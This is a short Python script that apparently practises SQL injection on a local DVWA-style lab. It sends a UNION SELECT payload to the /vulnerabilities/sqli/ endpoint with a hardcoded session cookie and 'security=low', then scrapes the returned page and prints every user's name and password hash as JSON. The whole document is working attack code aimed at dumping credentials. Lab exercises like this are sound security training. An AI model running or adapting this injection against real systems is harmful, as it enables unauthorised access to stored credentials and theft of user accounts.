#!/usr/bin/env python3

import json

import requests
from bs4 import BeautifulSoup

PROXIES = { "http": "http://localhost:8080", "https": "https://localhost:8080" }
PHPSESSID = "ushnp8l05q32i1j5ds985opl73"

# ----------------------------------------------------

def extract_element(text, start_label, end_label):
    i = text.find(start_label)
    j = text[i:].find(end_label)
    return text[i + len(start_label): i + j].strip()

def scrape_data_sqli_low():
    global PROXIES, PHPSESSID

    url = "http://localhost/vulnerabilities/sqli/"
    custom_params = {"Submit": "Submit", "id": "1' UNION SELECT first_name, password from users -- "}
    custom_headers = { "Cookie": f"PHPSESSID={PHPSESSID}; security=low; " }

    r = requests.get(url, headers=custom_headers, params=custom_params, proxies=PROXIES)

    soup = BeautifulSoup(r.text, "html.parser")

    users = []
    for pre in soup.find_all("pre")[1:]:
        text = str(pre)
        user = extract_element(text, "First name:", "<br/>")
        password = extract_element(text, "Surname:", "</pre>")

        users.append({
            "user": user,
            "password": password
        })
    
    print(json.dumps(users, indent=2))    

# ----------------------------------------------------

def main():
    scrape_data_sqli_low()

if __name__ == "__main__":
    main()
